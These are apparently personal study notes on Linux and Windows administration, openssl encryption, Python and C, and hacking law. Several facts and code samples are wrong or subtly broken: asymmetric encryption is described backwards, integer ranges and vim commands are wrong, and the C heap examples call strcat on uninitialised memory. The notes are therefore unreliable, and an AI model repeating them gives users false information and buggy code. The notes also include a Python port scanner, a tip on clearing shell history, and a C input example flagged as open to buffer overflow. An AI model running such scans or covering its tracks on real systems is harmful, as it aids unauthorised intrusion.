		Loaded by the BIOS when a computer is first turned on and is responsible for loading the OS
		Needed as creating a BIOS capable of loading hundreds of different operating systems would be too complex
		 Due to this, the bootloader is usually alongside the OS and is loaded from the HD by the BIOS.
	Virtualisation>
		Virtualisation is where we create a virtual machine out of software that behaves like a separate computer. 
		Host OS runs the VM, the Guest OS rusn inside the VM
		Types>
			Hypervisor>
				Layer of code that allows multiple operating systems to share the same hardware resources. EG deciding which bits of memory are used for which VM
				Type 2 Hypervisor: virtualisation is done by software that runs on an OS
				Type 1 Hypervisor: virtualisation occurs at the firmware level (no Host OS), used in server environments (data centres)
		Useage>
			 Efficiency imrpovements EG If you have a largely fluctuating user base, the web server could run off a small VM and have new VMs come on during peak times (the cloud hosting provider AWS offer this)
			 Access linux and windows tools without having to reboot, isolation allows for malware testing, test cross-platform software
		VM options>
			Get os: Use an ISO or mirror a virtual CD/DVD drive
			Network adaptor: NAT is used to share VM and host computer connection, Bridge VM acts a second PC conencted directly to the network, Host Only doesnt
				
<Linux>		
	Lots of distrobutions, desktops include a GUI
	Components>
		dock: saves frequently used applications, and running applications 
		start menu: by clicking it we can bring up a Windows-like start menu, which lists all applications. Searchable
		Systemn tray: shut down, reboot, update or access other settings such as volume, Bluetooth, notifications and network settings.
		Terminal occupies first position on the dock by default			

	Configuring Networking with the GUI>
		 find the Network Settings Preferences page (via system tray or start menu)
	Terminal>
		Type commands next to the prompt, user@hostname
		The shell is responsible for displaying the prompt, interpreting the commands you type, running programs and displaying the output to you
		The tilde character (~) indicates the users home diretory
	Superuser>
		administrative account (root user), can do anything
		Can use sudo command for temporay root privillages
		Do processes as user and not root unless neccessary
		if you must edit the sudoers file, use the 'visudo' command, which is a command line text editor that will check your sudoers file for any errors before it saves it.
	Directory structure>
		bin: The bin folder is typically used to store executable files (binary files), usually system files
		boot: holds the files that Linux uses during the boot up process.
		cdrom: The cdrom tray will usually be mapped to this folder, so if you have a cdrom plugged in you can access it's files.
		dev: The dev folder will contain a folder and associated files for every hardware component on the system. EG /dev/cpu	
		etc: The etc folder will usually contain configuration files for installed programs
		home: The home folder contains the user directories for every user on the system (that a user can log into), except root
		lib: The lib folder contains shared libraries and kernel modules. 
		lost+found: If your hard drive has errors and files get lost the 'orphaned' files may get placed here.
		media: The folders here can be used for mounting USB keys and floppy disks (load them)
		mnt: The folders here can also be used for mounting external drives, USB keys and floppy disks. 
		opt: Generally empty optional file, any user installed programs can go here
		proc (process): Every running program will have an entry in the proc folder along with associated files.
		root: The root folder is the home folder for the root user.
		run: The run folder is a temporary file system which stores runtime information for programs that start early during the boot up process.
		sbin: store binary executables (similar to /bin), normally they relate to administrative purposes.
		srv: The srv folder usually holds data used by services running on the system, EG web server
		sys: The sys folder contains information about devices on the system (as seen by the Linux kernel). 
		tmp: temporary files that will be deleted periodically and after reboot.
		usr: user-controlled files. It has its own folder structure, which maps to the root folder structure.
		var: The var folder contains system files which tend to increase in size over time (hence it's a variable size folder), EG log files and mail directory
	Significant files>
		// /etc/passwd:	Holds information about what user accounts exist, On old linux it also stores each user's password hash, in newer systems an x repersents where the PW hash used to be
		 //nologin accounts stored here
		// /etc/shadow: Holds all password hashes on new systems, only root can access
		
		First field of PW hash indicates algorithm>
			$1 = MD5 hashing algorithm.
			$2 = Blowfish Algorithm is in use.
			 $2a = eksblowfish Algorithm
			$5 = SHA-256 Algorithm
			$6 = SHA-512 Algorithm

	Navigation in the Terminal>
		//List files, can pass path
		//Long: -l, (If no colour codeing is used you can use this to get info on each file)
			ls {}
		//Move directory, path: /home/user, home folder: ~, go back a directory: ..
			cd {}
		//Print working directory
			pwd
	File permissions>
		ls -l [path] will tell you the user and user group
		
		Before each file there are a number of dashes used for file permissions
		1-: Indiacte directory or file, 2-, 3-, 4-: user permissions, 4-, 5-, 6-: group permission, 7-, 8-, 9-: other peoples permissions
		User Permission types: r: Read Permissions, w: Write Permissions, x: Execute Permissions 
		//Change current account 
			su [accountname]
		//Change to root account, will have to enter root PW
			su
		 //or
		 	su root	
		//Change owner
			sudo chown root [file_name]
		//Change group owner
			sudo chgrp root [file_name]
		//Give a file permissions, read/write/execute: r+, w+, x+, 
		// set all permissions: 755 (Each number repersents 1 of user/user group/others; Think of the number as binary for there effect, 111 = 7 so means +rwx, or Read = 4 Write = 2 Execute = 1 then add)
			chmod {} filename
	Packages>
		Package managers>
			apt-get>
				//Debian package manager, apt or apt-get
				//Update sources (servers with package info/download links)
					sudo apt update
				//Update installed software
					sudo apt upgrade
				//Download/remove software
					sudo apt install [packageName]
					sudo apt remove [packageName]
			yum>
				//Fedora package manager
				//Automatically updates sources
				//Upgrade isntalled software, blank: Update all software, [packageName]
					sudo yum update {}
				//Download/remove software
					sudo yum install [packageName]
					sudo yum remove [packageName]
		Packaged software>
			//Some packages not avaliable with the package manager come packaged with the Linux distro, doesnt install dependancies automatically
			dpkg>
				// .deb files are packages generated for Debian-based distros, install with dpkg
				// Install debian package
					sudo dpkg -i /home/user/cowsay.deb
				//Remove
					sudo dpkg -r cowsay
				//List packages installed
					dpks -l
			rpm>
				//Generated for Fedora-based distros
				//Install
					rpm -Uvh /home/user/cowsay.rpm
				//Remove
					rpm -e cowsay
				//List packages
					rpm -qa
			Building from source>
				//Look for INSTALL txt file
				//cd into direcotry with source code -> run configure ELF (executable) file to generate system specific makefile ->  run make to compile source code into an ELF -> 
				 // run sudo make install to move binary created and required files to system folders (now they can be used anywhere)	
					cd [pathToSourceCode]
					make [sourceCode]
					make install 
			
			
	Hidden files>
		//Create a hidden file
			.myfile
		//if a file doesnt exist teh touch command creates it (its empty), below will create a new hidden file
			touch .[filename]
		//use ls -a to see them
			ls -a
		//Locate a hidden file
			find -name .[filename]
	Environment variables>
		Data is ephemeral (disapears when you close the terminal window)
		//Print a EV. /home/user
			echo $HOME
		//Chaneg the value of a EV temporarily
			export HOME=/tmp
		//Get all EV
			printenv
		PATH EV>
			The PATH EV contains paths separated by colons
			When you type a command the terminal check the current folder, then it checks PATH for binary executables
			echo $PATH 
			//Get the path of EV
			which [EV name]
			//When you open a bash shell it runs the script .bashrc, so you can add an export statement here to set PATH permanently
			export PATH=$PATH:/mycustomfolder
	History>
			//History file stores past commands EG .bash_history
			//Read file
				history
			//Clear history in memeory, delete the file to destroy pernament memory
				history -c
			//At the end of the terminal session, the file in memory is written to the .bash_history file in the user's home folder.
			Previous Commands>
				Use up arrows to go back to previous commands
				For a reverse-command-search use CTRL + R, then type in part of a previous command, CTRL + R again to go further back
	
	Parameters>
		//Linux syntax 
		//single letter parameters, can chain them 
		-
		// full word chacracters
		--
		//Get help on parameters
		[bin name] -h
		man [bin name]
		//BSD syntax uses no dashes before a parameter
	Tab completion>
		Automatically fill in names of executable terminal commands and accessable files/folders 
		EG In a folder with the file Templates: cd T + Tab -> cd Templates
		If there are multiple files  with similar words TC wont do anything, type more letters and then Tab
		Press tab twice for all matches
	Interrupts>
		Quit with given command or CTRL + C	
		Suspend with CTRL + Z, then bg (background) or fg (foreground)
	Operators>
		//Combine commands with pipe
		[commandOne] | [commandTwo]
		//Redirect output to a file, >: overwrite target entirely or create file, >>: Append output to file or create file
	Other commands>	
		//Clear terminal, or CTRL + L
			clear
		//Get file headers
			file [filePath]
		//Get sequences of ASCII characters <=3 (generally strings) from file
			strings [filePath]
		//Download webpages
			wget [url]
		Text editor>
		//Either will create file if it doesnt exist
			//Command line text editor, exit with CTRL + X, shows hotkeys
				nano [filePath]
			vim>
				//More powerful CLI text editor
					vim [filePath]
				//use i for insert/interactive mode and CTRL C to exit
				// :q quit with saved changes, :q! quit while you have unsaved changes, :wq or :x save and quit, 
		Processes>		
			//See running processes using the most resources
				top
			//See current user processes, blank: see processes for current user, aux or -ef -f: see all processes, auxf: get subprocesses 
				ps {}
			//Get PID
				pgrep
			//Kill process: -9: kill 
				kill -{signal} [PID]
			//Use pipe operator to: scroll through, find stuff, find stuff and ignore grep process
				ps auxf | less
				ps aux | grep [processName]
				ps aux | grep bash | grep -v grep
			cron table>
			//Schedule commands to run at regular time intervals
				//Open crontab to edit tasks
					crontab -u [user]  [filePath]
				//Can edit /tmp/crontab
				minute(0-59) hour(0-23) day(1-31) month(1-12) weekday(0-6) command
				EG
					0,14,29,44 * * * * /usr/bin/example2
					runs /usr/bin/example2 at the 15-minute mark on every hour, every day. Make sure you add each new task on a new line.
		print stuff>
			// concatenate (print a file), can add as many files in a row as you want
				cat [filePath]
			//Open file in terminal program where you can scroll through it, must use q to exit (not CTRL + C) 
			//Gradually load program into memory
				less [filePath]	
		Search for stuff>
			//find files, searchMethods: -name; can use wildcards in file name EG "*myfile*"  
				find [searchDirectory] -{searchMethod} [fileName]
			//Find text within files
			// For the searchTerm use "" to fing a specific word, EG "room" -> room, room -> roomName rooms   
			//blank: no parameters, -i: Case insensitive
				grep {} [searchTerm] [filePath]
			//Show where a tool is stored in your path, if no results you know to add to path 
				which [toolName]
			
			//Search man pages for key words, use "" to make sure its isolated
				apropos ["keyword"]
			// then you can use
				man [keyword]
		Do stuff to files>
			//Can use different name for the pasted file for cp or mv, cp and rm need -r to effect folders
			//Copy a file
			//blank: no parameters, -r or -R: use recursive parameter to copy directories
				cp {} [filePath] [filePath]
			//blank: no parameters, -n: Dont overwrite, -u: overwrite if timestamp is newer 
				mv {} [filePath] [targetFilePath]
			//Rename file
				mv [filePath] [filePathEndingInADifferentName]
			//remove stuff
			//blank: no parameters, -r: recursive, allows to remove folders
				rm {} [filePath]
			//Make directory
				mkdir /home/users/mynewfolder
			//Make multiple directories
				mkdir -p [folderName]/[subFolderName]/[subFolder2Name]
			//Set permissions
				mkdir -m 777 dirname
		
		network>
			SSH>
				//Secure SHell, log onto a computer over the internet
					ssh username@ipaddress
				//If a keyfile is needed instead of a separate password
					ssh -i /path/to/keyfile username@ipaddress
			
<Windows>
	Network setup: control panel -> all control panel items -> network and haring centre -> [chose network connection] -> IPv4, turn on or off DHCP 
	Windows defender: Turns off automatically when you install anouther AV
	Windows firewall blocks unknown inward and outward connections, asks for permission once per program
		WF Profiles> 
			Domain: Applies when a computer is connected to its Active Directory domain. Specifically, any time a member computer’s domain controller is accessible, this profile will be applied.
			Private: Applies when a computer is connected to a private network location. By default, no networks are considered private—users must specifically mark a network location, such as their home office network, as private.
			Public: The default profile applied to all networks when a domain controller is not available. For example, the Public profile is applied when users connect to Wi-Fi hotspots at airports or coffee shops. By default, the Public profile allows outgoing connections but blocks all incoming traffic that is not part of an existing connection.

	Active Directory allows administrators to configure settings on Windows desktops that are connected to a Windows server.
	Registry>
		Edit with regedit
		%SystemRoot%\System32\config
		Hives are groups of keys, lowest hive is the root
		Key -> set of subkeys -> set of subkeys or values to those keys
		HKCR (HKEY_CLASSES_ROOT): Information stored here ensures that the correct program opens up when it is executed.
		HKCU (HKEY_CURRENT_USER): Config for users currrently logged on, generic info about mounted drivers
		HKLM (HKEY_LOCAL_MACHINE): hardware specific information (that the OS runs on), windows and software settings, settings loaded into memory when the OS starts
		HKU (HKEY_USERS): Config info for current logged in user
		Hives
			SAM, SECURITY, SYSTEM, SOFTWARE, DEFUALT
				
		Turn off cortana: 
			HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search
			Create new DWORD32 entry in the registry called 'Allow Cortana' with the value 0
	Log files>
		View with Event Viewer
		Find the cause of a blue screen of death, check remote logins
	
	Authentication>
		User accounts>
			Default Accounts: Administrator (full control), Guest (people who own no account), DefaultAccount (template for new accounts)
			Account Types: Administrator (Make changes that effect all users), Standard (Similar to admin but cant change things that effect everyone), Child: parental control
			Create a user: Control panel, management console (lusrmgr.msc)
			The first user first created when windows is downloaded is an adminstrative user but not an administrator account
			Groups> 
				Administrators, Users (cant install stuff or make system changes), Remote Desktop Users (need to be a member to connect to the machine), Guests (Any members of the Guests group do not have permanent profiles on the machine.)
				Use lusrmgr.msc to create new groups
			User account control>
				Works by assigning 'tokens' to the user when they log in, the standard token can jsut run stuff, 
				admin makes system changes -> a prompt appears to verify the request -> administrative token to used to run that app
				 If a user tries to make changes then a prompt for the admin UN and PW appears
				 Configure UAC>
					You can configure UAC to be more or less, permissive 
						start menu -> Change User Account Control Settings
							Always notify, Notify me only when apps try to make changes to my computer (no shown when changing settings)
							 Notify me only when apps try to make changes to my computer (do not dim my desktop), Never notify (all admin requests accepted and all user requests denied)
			File permissions>
				Each file or folder has an Access Control List (ACL) which stores who is allowed which level of access.
					Files>	
						Full Control: gives you all available permissions for the file.
						Modify: allows you to read, write, modify and execute the file.
						Read & Execute: allows you to display the file's contents, and run the file if it's a program.
						Read: allows you to open the file, and view its contents.
						Write: allows you to write data to the file.
					Folders>
						The 5 files permissions with generally the same effect but allow the edit the folder and its contents
						List Folder Contents: allows you to display the folder's contents, the contents of files inside, and run any programs in the folder.
					
				Deny permissions allows overide an allow
				When you copy or move an object to another volume, the object inherits the permissions of its new folder
			Hidden files>
				Dont show up when viewing folders
				foler options in file manager ribbon -> view tab -> change option to show hidden folders
				
	Windows command line>
		automate tasks by running scripts or batch files, carry out administrative tasks, and troubleshoot and solve issues. 
		When running as an admin console starts at C:\Windows\System32 rather than the users home
		General>
			//Change drive 
				D:	or	cd /D C:\Windows
			//Get directory details, /A: show hidden files
				dir {}
			Move/edit folders/files>
				//Make directory
					mkdir {[pathname]}
				//Copy just files
					copy [fileSourcePath] [directoryDestinationPath]
				//Copy multiple files EG
					copy *.txt [folderDestinationPath]
				//Copy anything, /s: Copy entire directory tree, /e: Copy empty directories 
					robocopy [folderSourceParh] [directoryDestinationPath] {}
				//Get help
					robocopy /?
				//Move anything
					move [sourceParh] [directoryDestinationPath]
				//Delete files
					del [filePath]
					del *.txt
				//Delete directories, command will fail if directory is not empty /S: override empty condition
					rmdir [directoryPath] {}
				//Rename stuff
					ren [pathOne] [pathTwo]
			//Display contents of a file one page at a time
				dir "c:\Windows" | more
			//Search files for text strings, hide error msgs
				find C:\Users\User\* "hello" 2>nul		
			//Get file path (linux which command), /R: Display a directory
				where [fileName] {}
		Network>
			//Get info
				ipconfig
			//Setting IP 
				netsh interface ip set address [connection name] static [IP] [subnet] [gateway]
			//Access files stored on a network
				//List commands
					net {[commandName]} /?
				//Mount a network drive
					net use x: \\DESKTOP-3VSCDO9\Share
				//Remove mounted drive
					net use x: /delete
			//See network connections
				netstat
			
		User management>
			//View current users
				net user
			//Add user, enter * inplace of PW to enter it in the next work
				net user /add [username] [password]
				net user /delete [username]
			//View groups
				net localgroup
			//Check current user group memebership
				net user [username]
			//Add a user to a group
				net localgroup [groupName] /add [userName]
		
	PowerShell>
		.NET framework with command line shell and scripting language
		PowerShell Cmdlets: Powershell local lightweight command that does something and returns the result as a .NET object,
		 use this with more cmdlets or by writing to a file/screen, no exe file relates to the cmdlets so they cant be accessed outside the PS
		 Execution Policy restricts PS scripts that are allowed to run	
		 cmdlets have a 'verb-noun' naming system
		 PowerShell Integrated Scripting Environment (ISE)>
			Write/run/test PS scripts
			Has tab completion and search commands,
		//Get help
			[command] -?
		//Find commands	
			Get-Command -Noun Computer
			Get-Command -Verb Stop
		//Format output to a table
			Generate-Table
		
		//Global object, contains default search path for powershell modules.
		env:psmodulepath
		
		Aliases>
			//Generally commands have longer names than Bash and CMD alternatives, though powershell comes with several aliases set up for common cmdlets
			Default aliases>
				//ls, dir
					Get-ChildItem 
				//cat (Get contents of a file)
					Get-Content
				//cd
					Set-Location {targetDirectoryPath}
				//rm (delete files and folders)
					Remove-Item
			//Blank: Get all set aliases, -Name [aliasName],  
				Get-Alias {}
			// -Name [alias_name], -Value [cmdlet_to_run]
				Set-Alias {} {}
		Processes>
			//blank: List all running processes, -Name [processName]: get a specific process
			Get-Process {}
			Start-Process -FilePath ["exeName/activationCommand"]
			//-Name {processName}, -ID {processID}; confirm: Good if stopping processes with names and wildcards 
			Stop-Process {} {}  
		Objects>
		//cmdlets are designed to deal with objects, so outputs are more than text
		//Each object contains properties (contain info about object (last access time, parent and root directories)) and  methods (manipulate object)	
			//Check info stored inside the result of a command
			Get-ChildItem | Get-Member
			//EG concerning the above command, you could use the Delete Method to delete the directory that object repersents

			//Store result of a command in a variable
			$child_items = Get-ChildItem
			//List names
			$child_items.Name
			//Access methods
			$child_items.[methodName]()
		
<Encryption>		
	/*Encryption is the process of converting data from one form into another, so that only the intended recipient can understand the information
	Encryption capabilites: Authentication (verify origin), Integrity (proof of no tampering), non-repudiation (sender cant deny sending the msg) 
	To encrypt: Original data + encryption key, encryption algorithm (the same with decrypt)
	Good encryption: Public algorithms that dont reliy on secrecy, dont use old encryption
	Crack encryption: Find a flaw in the algorithm, guess encryption key
	*/Encoding difference: Encoding isnt designed to be unreadable for all but the indetended recipient
	Symmetric encryption>
		//Encryption key that is used to encrypt a message is the same encryption key that is needed to decrypt the message.
    	//Old: Caesar cipher
			//26 letters/shifts to test
		//Modern: AES 
			//Can support encryption keys of size 128, 192 or 256 bits
			//Medium speed (so its slower to try every possible key)
			//Still need to exchange the key		
			
			//Encrypt file with DES, enter PW after command
			openssl enc -des -in [plainText.txt] -out [encryptedFile.enc]
			//Decrypt, enter PW after command
			openssl enc -des -d -in [encryptedFile.enc] -out [plainText.txt]
					
			
	Asymmetric Encryption>
		//Every party generates private and public Encryption Keys
		//Public key decrypts the plain text, private decrypts
		//Still have problem of key exchange
		//Key parts: public and private parts, known as a keypair
		//Generate keypair
			openssl genrsa -out private.pem 2048
		//Extract public key
			openssl rsa -in private.pem -outform PEM -pubout -out public.pem
		//Encrypt
			openssl rsautl -encrypt -in [plainText.txt] -pubin -inkey public.pem -out [cipher.txt]
		//Decrypt
			openssl rsautl -decrypt -in [ciper.txt] -inkey private.pem -out [plainText.txt]
		
		
	HTTPS>
		//Use SE and AE 
		//website has an SSL certificate which is signed by a certificate authority (if the browser trusts this it will trust the SSL cert is genuine)
		SSL cert acts as the public key (AE), once a SE key is negotiated SE is used for the rest of the traffic
		
		https://en.wikipedia.org/wiki/HTTPS
		https://tools.ietf.org/html/rfc2818
		https://en.wikipedia.org/wiki/Certificate_authority
	Hashing>
		 //one-way encryption
		 //Use to store PWs, in computer forensics prove evidence wasnt tampered with 
		 //MD5, SHAs: 1, 2, 3, 256, and 512, MD5 and SHA1 are insecure
		 // When repersenting a large file in a short hash multiple files could coalesce to the same hash value, collisions of input data to the same hash output can occur


<Scripting languages>
	Converting human readable code to machine code>		
		A computer program is a series of instructions to the processor of a computer
		 Programming languages exist for the benefit of humans, making it easier for us to write computer programs and provide computers with instructions. Before a processor can understand the code that you've written, it must first be converted to a format that the processor understands
		 When a programming language is compiled, it's converted into machine code and then saved as an ELF
		 When a programming language is interpreted, the code is converted and executed at the time the user runs the program, converted instructions are not saved.
		Complied programs are faster, but different versions need to be compiled for each processor architecture
		 low-level programming language is closer to how the processor "thinks", good to work with processor or OS 
		high-level language is more abstract from the machine code that it produces, they have more complexity to the computer
		
	Python> //TODO Link to python help docs
		//When stuck search the docs for more info or alternative methods
	
		//run program
			python [fileName.py]
		//Get variable type
			type(true)
		//Escape ' used inside other marks
		'  "   \'  "  '
		
		round(42.12345, 2)
		
		//convert types		
		bool(), str(), float(), int()

		//Get user input from the command line
		import sys
		arguments = sys.argv
		print(arguments)
		
		Threads>
			//by default, the program can then only do one thing at a time.
			// EG with sockets recv() method blocks new connections from anouther computer
			//Use threads to make the program multi-threaded
			import socket
			import thread
			# Thread handler
			def handler(client_sock, address):
				client_sock.send("Do you want to play a game?\n")
				data = client_sock.recv(1024)
				print(repr(address) + " said: " + data)
				client_sock.close()
				print(repr(address) + " connection ended.")
			# Set up our server
			server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server_socket.bind(("0.0.0.0", 1337))
			server_socket.listen(10)
			# Run the server with threads
			while True:
				print("Server listening for connections...")
				client_sock, address = server_socket.accept()
				print("Connection from: " + repr(address))
				thread.start_new_thread(handler, (client_sock, address))
		Port scanner>
			// port scanner is a tool that will try to connect to ports on a target system and report back about which ones are open or not.
			//Can add mutli-threading so that you dont have to wait for port timeout
			import socket
			print("Please enter an IP Address to scan.")
			target = raw_input("> ")
			print("*" * 40)
			print("* Scanning: " + target + " *")
			print("*" * 40)
			for port in range(1, 1025):
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				result = s.connect_ex((target, port))
				if result == 0:
					print("Port: " + str(port) + " Open")
				s.close()		
							
		PEP 8 style guide>
			code is for humans so make it easier to read
			Indention should use 4 spaces
			Lines should be limited to a length of 79 characters
			Use of whitespace in expressions and statements
			When and where to use block comments vs inline comments vs documentation strings
			Variables and functions should be named in lowercase with words separated by underscores
			Classes should be named with CapWords convention.
		Defense programming>
			//Aims to expect the unexpected, in order to prevent bugs and unexpected behaviour from occurring.
			Assertions> 
				//Account for assumptions beforehand
				// EG for a function that expects a +ve number add a conditional to detect -ve numbers
				#Throws assert error when called with a negative
				def no_negatives(number):
					assert number >= 0, 'negative value passed to the no_negatives() function!'
					print(number)
				no_negatives(-5)	
			//use print to test functions, or write a function to test multiple possible inputs
		Programming Paradigms>
			Approaches to building programs
			Procedural>
				break down tasks into a series of steps. Frequently repeated tasks are split apart into reusable functions called at any time (usually by other programs)
				Logic and the data are often quite separated. 
				Good for small to medium sized programs with minimal to moderate amounts of complexity.
			Object-oriented programming>
				uses classes to model objects, capturing both their attributes - the data that describes them - and their methods - the behaviours they have.
				EG a User() object from a Users() class with methods change_user_name() and change_user_email()
				The object can be used at multiple stages of the program
				Complex to make but easier to understand and maintain, great for large programs
			//Before starting: To plan think of questions surrounding problem, psedocode
			//Good habits: Reduce nesting, keep functions small, avoid code duplication, work on one piece at once, test frequently
			//Debugging: find a way to replicate the issue reliably -> figure out where the bug is in the code -> 
			// understand why the bug occurred -> refactor to eliminate the bug
	C>
		//low-level programming language, created in 1972
		//Adv: On all systems and portable, makes up other languages, quick, mature language
		//DisAdv: No safety net, can lead to exploitable software and bugs,   
		//Contains no object oriented features, C++ does though
		
		//It 32 bit compling doesnt work, some possible packages
			sudo apt-get install libc6-dev
			sudo apt-get install gcc-multilib
			sudo apt-get install libc6-dev:i386

		//Run a C program via compling it into an ELF
		gcc -o hello hello.c
		//Specify processor arcitechure
		gcc -m32 -o hello hello.c
		//Use MinGW cross-complier to compile for windows
		
		Data Types>
			Integer>
				//int: An integer value, short: A short integer value, long: A long integer value
				//These can be unsigend or signed (can be a -ve value, but the most signifcant bit is a sign bit (so 2^31))
				 //EG A signed 32 bit integer -32,767 to +32,767, unsigned: 0 to 65535, "^16 = 65535 so 16 bits in size"
				 //A short is similar to an integer, A signed long: -2,147,483,647 to +2,147,483,647, unsigned: 0 to 4,294,967,295		 
			Float>
				//Float: Single-precision floating point value.
				//Double: Double-precision floating point value.
			Char>
				//Integer type that is always 1 byte large, can hold characters
				//For a string make an array of characters
				// Use '' for a char and "" for a char array
			//use stdio.h for all input/output related functions
			#include <stdio.h>
			int main(){
				int anInt = 42;
				long aLong = 42;
				short aShort = 42;
				unsigned int anUnsignedInt = 42;
				unsigned long anUnsignedLong = 42;
				unsigned short anUnsignedShort = 42;
				printf("anInt contains: %d and is size: %lu\n", anInt, sizeof(anInt));
				printf("aLong contains: %ld and is size: %lu\n", aLong, sizeof(aLong));
				printf("aShort contains: %hd and is size: %lu\n", aShort, sizeof(aShort));
				printf("anUnsignedInt contains: %u and is size: %lu\n", anUnsignedInt, sizeof(anUnsignedInt));
				printf("anUnsignedLong contains: %lu and is size: %lu\n", anUnsignedLong, sizeof(anUnsignedLong));
				printf("anUnsignedShort contains: %hu and is size: %lu\n", anUnsignedShort, sizeof(anUnsignedShort));
				
				char character = 'A';
				printf("character is: %c\n", character);
				printf("character is also decimal: %d\n", character);
				printf("character is also hexadecimal: %x\n", character);
				char string[] = "Hello, World!";
				printf("A string is just an array of characters, for example: %s\n", string);
				
				#Increment: 
				anInt++
				anInt--
				
				return(0);
			}
			//String specifiers: %d is for an int, %ld is for a long, %hd is for a short, 
			// %u is for an unsigned int, %lu is for an unsigned long, %hu is for an unsigned short
			// %c is for a character, %x is for hexadecimal
		   // %s is for a string (expects Char Array terminated with a null byte which is hexadecimal 0x00)
		Functions>
			#include <stdio.h>
			int addStuff(int valueA, int valueB) {
				puts("The addStuff function was called");
				return(valueA + valueB);
			}
			int main() {
				int result = addStuff(5, 10);
				printf("The answer is: %d\n", result);
				//Return 0 if the program run successfully or 1 if unsuccessfully
				return(0)
			}
		Conditionals>
			int r = rand() % 20;
			if (r < 5) {
				puts("r is less than 5");
			} else if (r > 15) {
				puts("r is greater than 15");
			} else {
				puts("r is not less than 5 or greater than 15.");
			}
		Loops>
			for (x = 0; x <= 5; x++){
				printf("x is %d\n", x);			
			}		
		Lists>
			//Same as char arrays, can only hold data type used to create it, cant increase size (is a set)
			char array[] = {'H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd'};
			puts(array[0])	
		Input>
			//Array stores 20 bytes of data
			char data[20];
			puts("Enter some data here: ");
			//Points to the space on the memory stack
			scanf("%s", &data);
			printf("You entered: \n%s\n", data);
			//User can exploit with buffer overflow, since the ycan enter >20 bytes
			
			//More secure, max bytes to read, adds a newline
			fgets(data, sizeof data, stdin);
			printf("You entered: \n%s", data);
			
			//If newline is cut off add before printing result
			if (strlen(data) > 0){
				if (data[strlen(data) - 1] != '\n') {
					data[strlen(data) - 1] = '\n';
				}
			}	
			
			Command line arguments>
				int main(int argc, char *argv[]) {
					int i;
					for (i = 0; i < argc; i++) {
						printf("Arg %d: %s\n", i, argv[i]);
					}
					return(0);
				}
		Files>
			#include <stdio.h>
			#include <string.h>
			int main() {
				char data[20];
				FILE *file = fopen("test.txt", "r");
				fgets(data, sizeof data, file);
				if (strlen(data) > 0){
					if (data[strlen(data) - 1] != '\n') {
						data[strlen(data) - 1] = '\n';
					}
				}
				printf("The file contains: \n%s", data);
					fclose(file);
				return(0);
			}
		Pointers and memory>
			//when a variable is declared, that memory will exist on the stack, though the program needs to know exactly 
			// how much memory to allocate during compiling, so a max no. of characters is needed
			//memory on the heap can be allocated dynamically during runtime, so user can type any number of characters
			
			//A pointer is just a memory address that points to the contents of a variable
			//Saving a variable process: the program asks the kernel for some space in memory -> kernel provides a memory address -> data is stored into memory at that location.
			//Access memeory address
			&variableName
			//Because each function has its own stack frame, variables on the stack cant be accessed outside of their function. 
			// This means passed variables are just a copy (passing by reference)
			
			//To pass by reference (the actual variable) you can pass the memory address 
			#include <stdio.h>
			//doStuff function expects a pointer to an integer value
			void doStuff(int * stuff){
				//Access the data at the pointer
				*stuff = 1337;
				printf("Within the doStuff() function, the variable stuff has the value: %d\n\n", *stuff);
			}
			int main() {
				int stuff = 42;
				printf("Within the main function, before doStuff is called, the variable stuff has the value: %d\n\n", stuff);
				doStuff(&stuff);
				printf("Within the main function, after doStuff is called, the variable stuff has the value %d\n\n", stuff);
				return(0);
			}
			
			//Save stuff to the heap, it exists until you call free() on it 
			#include <stdio.h>
			#include <stdlib.h>
			#include <string.h>
			#include <time.h>
			int main() {
				// This program generates a random number between 0 and 19.
				// Creates a random number 0 to 19, then it creates a character array in memory on the heap 
				// big enough for that number of characters
				srand (time(NULL));
				int r = rand() % 20;
				printf("Going to save %d 'A's into memory this time!\n", r);
				// Create space for 'chars' number of characters + 1 byte on the heap
				// The extra byte is for the string line terminator which is a 0x00 or a null byte
				char *string = malloc((sizeof(char) * r) + 1);
				// For loop to add 'r' number of A's to the address at the string variable on the heap
				int i;
				for (i = 0; i < r; i++) {
					// The strcat function concatenates two strings together.
					// with parameters: result destination, string to add to destination
					strcat(string, "A");
				}
				puts(string);
				//Free heap memory when it is no longer needed, dont forget as it can lead to memory leaks
				free(string);
				return(0);
			}
						
			//Return a string, use the heap to pass by reference 
			#include <stdio.h>
			#include <stdlib.h>
			#include <string.h>
			#include <time.h>
			char *getStr(int chars) {
				// Create space for 'chars' number of characters + 1 byte on the heap
				// The extra byte is for the string line terminator which is a 0x00 or a null byte
				char *string = malloc((sizeof(char) * chars) + 1);
				// For loop to add 'chars' number of A's to the address at the string variable on the heap
				int i;
				for (i = 0; i < chars; i++) {
					strcat(string, "A");
				}
				return(string);
			}
			int main(){
				// This program generates a random number between 0 and 19.
				// Then it creates a character array in memory on the heap big enough for
				// That random number of characters.
				// Generate a random number between 0 and 19
				srand (time(NULL));
				int r = rand() % 20;
				printf("Going to save %d 'A's into memory this time!\n", r);
				char *res = getStr(r);
				puts(res);
				free(res);
				return(0);
			}
			/* So the methods to pass actual varaibles between functions are (pass by reference):			
			You could create a variable in the main function and pass a pointer to the variable into the doStuff function, 
			 which will then modify the data at that memory address and then return. This would work because the variable 
			 was created in the main() function, which hasn't returned yet.
			 You could allocate memory on the heap, and return a pointer to that memory address. 
			 Memory on the heap exists until you call free() on it, no matter where it was created, so even if you 
			 allocate the memory inside the doStuff() function it will still exist even when the doStuff() function returns.
			*/
				
<Security>	
	law>
		Laws>
			Unauthorised access to computer material.
			Unauthorised access with intent to commit or facilitate the commission of further offences.
			Unauthorised acts with intent to impair, or with recklessness as to impair the operation of computer systems, etc.
			Unauthorised acts causing or creating risk of, serious damage to a computer system.
			Making, supplying or obtaining articles for use in items 1 - 4 above.
		Penetration testers>
		    Get permission in writing and make sure it is signed.
			Make sure the person who granted you permission is authorised to do so.
			Make sure you have a breakdown of the scope of your permission. Which systems can you target? Is anything off-limits?
		Easy to get caught: Local and central logging, traces in RAM, 
		Ethics: Ruin livelyhoods, privacy, find/cause a hole in companies security for a malicious hacker       
		Practise>
			Challenges
				https://www.vulnhub.com/
				http://overthewire.org/wargames/
			Recreate attacks with VMs
			Find vulnerabilities in software on your computer, build own set of challenges for others and host online, get a job
	Tatics>
		Read and blue teams>
